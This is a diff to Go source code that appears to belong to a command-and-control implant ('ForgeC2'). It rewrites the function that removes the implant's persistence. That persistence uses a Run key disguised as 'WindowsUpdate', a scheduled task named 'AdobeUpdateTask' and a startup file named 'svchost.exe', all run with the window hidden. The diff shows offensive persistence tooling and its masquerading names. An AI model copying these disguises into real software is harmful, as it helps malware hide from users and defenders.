@@ -433,31 +433,49 @@ func listPersistence() string {
 func removePersistence(method string, args string) string {
 	switch method {
 	case "registry":
-		cmd := exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/f")
-		applyHideWindow(cmd)
-		out, err := cmd.CombinedOutput()
-		if err != nil {
-			return fmt.Sprintf("registry remove: failed: %v %s", err, string(out))
+		// Remove both the auto-install name (WindowsUpdate) and the explicit
+		// install name (persistencePrefix) so cleanup matches either scheme.
+		removed := false
+		for _, name := range []string{"WindowsUpdate", persistencePrefix} {
+			cmd := exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", name, "/f")
+			applyHideWindow(cmd)
+			if _, err := cmd.CombinedOutput(); err == nil {
+				removed = true
+			}
+		}
+		if !removed {
+			return "registry remove: failed (no Run key entry found)"
 		}
 		return "registry: removed Run key"
 
 	case "scheduled_task":
-		cmd := exec.Command("schtasks", "/delete", "/tn", "AdobeUpdateTask", "/f")
-		applyHideWindow(cmd)
-		out, err := cmd.CombinedOutput()
-		if err != nil {
-			return fmt.Sprintf("scheduled_task remove: failed: %v %s", err, string(out))
+		removed := false
+		for _, name := range []string{"AdobeUpdateTask", persistencePrefix + "Update"} {
+			cmd := exec.Command("schtasks", "/delete", "/tn", name, "/f")
+			applyHideWindow(cmd)
+			if _, err := cmd.CombinedOutput(); err == nil {
+				removed = true
+			}
 		}
-		return "scheduled_task: removed ForgeC2Update"
+		if !removed {
+			return "scheduled_task remove: failed (no task found)"
+		}
+		return "scheduled_task: removed task"
 
 	case "startup_folder":
 		appData := os.Getenv("APPDATA")
 		if appData == "" {
 			appData = os.Getenv("LOCALAPPDATA")
 		}
-		startupPath := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe`)
-		if err := os.Remove(startupPath); err != nil {
-			return fmt.Sprintf("startup_folder remove: failed: %v", err)
+		startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
+		removed := false
+		for _, name := range []string{"svchost.exe", persistencePrefix + ".exe"} {
+			if err := os.Remove(filepath.Join(startupDir, name)); err == nil {
+				removed = true
+			}
+		}
+		if !removed {
+			return "startup_folder remove: failed (no startup file found)"
 		}
 		return "startup_folder: removed startup file"
 
